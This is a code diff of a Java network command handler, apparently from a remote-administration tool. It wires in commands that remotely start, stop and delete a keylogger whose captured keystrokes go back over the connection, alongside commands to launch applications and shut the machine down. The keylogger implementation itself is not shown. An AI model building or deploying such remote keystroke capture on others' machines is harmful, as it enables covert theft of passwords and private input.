@@ -40,7 +40,7 @@ public class ActionThread extends Thread {
 		try {
 			ObjectOutputStream oos = new ObjectOutputStream(outputStream);
 			ObjectInputStream ois = new ObjectInputStream(inputStream); 
-
+			KeyLogger KL = new KeyLogger(oos);
 			String request = (String) ois.readObject();
 			String[] request_elements = request.split(" ");
 
@@ -96,7 +96,25 @@ public class ActionThread extends Thread {
 				} else {
 					this.record += "name not found";
 				}
-				main.actionRecorded(fromIP, record);
+				main.actionRecorded(fromIP, record);}
+			else if (request.equals("KEY_LOGGER_START")) {
+//				System.out.println(recorded);
+			//  if(recorded == false) {
+			//	System.out.println("go in here");
+			//	recorded = true;
+			//	System.out.println(recorded);
+
+				KL.get_Keylogger(oos);
+			
+			}else if (request.equals("KEY_LOGGER_STOP")) {
+				//KeyLogger KL = new KeyLogger(oos);
+				//KL.unhook();
+				KL.send_Keylogger();
+			}else if (request.equals("DELETE_KEY")) {
+				//KeyLogger KL = new KeyLogger(oos);
+				KL.delete();
+			//	KL.unhook();
+			
 			} else if (request_elements[0].equals("START_APPLICATION")) {
 
 				AppStart appStart = new AppStart(oos, request_elements[1]);
@@ -110,12 +128,7 @@ public class ActionThread extends Thread {
 					this.record += "name not found";
 				}
 				main.actionRecorded(fromIP, record);
-			} else if (request.equals("KEY_LOGGER_START")) {
-				KeyLogger keyLogger = new KeyLogger(oos, "");
-				keyLogger.get_Keylogger(oos);
-			} else if (request.equals("KEY_LOGGER_STOP")) {
-				KeyLogger keyLogger = new KeyLogger(oos, "");
-				keyLogger.send_KeyLogger();
+
 			} else if (request.equals("SHUT_DOWN")) {
 				ShutDown shutDown = new ShutDown(oos);
 				shutDown.shutDown();
